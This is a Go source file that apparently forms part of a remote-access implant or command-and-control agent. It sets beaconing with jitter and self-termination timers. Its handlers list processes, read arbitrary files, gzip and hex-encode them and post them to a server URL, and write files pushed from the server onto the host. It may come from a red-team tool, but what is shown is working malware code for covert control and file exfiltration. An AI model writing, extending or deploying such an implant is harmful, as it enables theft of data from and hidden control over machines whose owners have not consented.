package agent_helper

import (
	"bytes"
	"compress/gzip"
	"io"
	"os"
	"strconv"
	"strings"
)

var CallbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20, StartDelay: 5}

func PsHandler(serverUrl string, taskData map[string]interface{}) {
	processList, err := get_ps()
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, processList)
}

func ReconfigHandler(serverUrl string, taskData map[string]interface{}) {
	splitArgs := strings.Split(taskData["args"].(string), " ")
	CallbackTimer.Callback_freq, _ = strconv.Atoi(splitArgs[0])
	CallbackTimer.Jitter, _ = strconv.Atoi(splitArgs[1])
	CallbackTimer.SelfTerminate, _ = strconv.Atoi(splitArgs[2])
	DataShipper(serverUrl, taskData, "true")
}

func DownloadHandler(serverUrl string, taskData map[string]interface{}) {
	inFile, err := os.Open(taskData["args"].(string))
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	defer inFile.Close()
	var buf bytes.Buffer

	gzipWriter := gzip.NewWriter(&buf)
	defer gzipWriter.Close()

	gzipWriter.Name = taskData["args"].(string)
	if _, err := io.Copy(gzipWriter, inFile); err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	if err := gzipWriter.Close(); err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	FileTransferShipper(serverUrl, taskData, buf.Bytes())

}

func UploadHandler(serverUrl string, taskData map[string]interface{}) {
	uploadArgsParts := strings.Split(taskData["args"].(string), ":")
	destFile, err := DecodeFromHexBaseString(uploadArgsParts[0])
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
	}
	outputFile, err := decodeUpload(uploadArgsParts[1])
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	err = os.WriteFile(destFile, outputFile, os.FileMode(os.O_CREATE|os.O_WRONLY))
	if err != nil {
		DataShipper(serverUrl, taskData, err.Error())
		return
	}
	DataShipper(serverUrl, taskData, "true")

}

func FileTransferShipper(serverUrl string, taskData map[string]interface{}, results []byte) {
	encodedOutput := EncodeBytesToBaseHexString(results)
	encodedArgs := EncodeToBaseHexString(taskData["args"].(string))

	result := ResultsCreate{
		TaskingID: taskData["id"].(float64),
		Session:   taskData["session"].(string),
		Task:      taskData["task"].(string),
		Args:      encodedArgs,
		Results:   encodedOutput,
	}
	_, _ = PostJson(serverUrl, result)

}
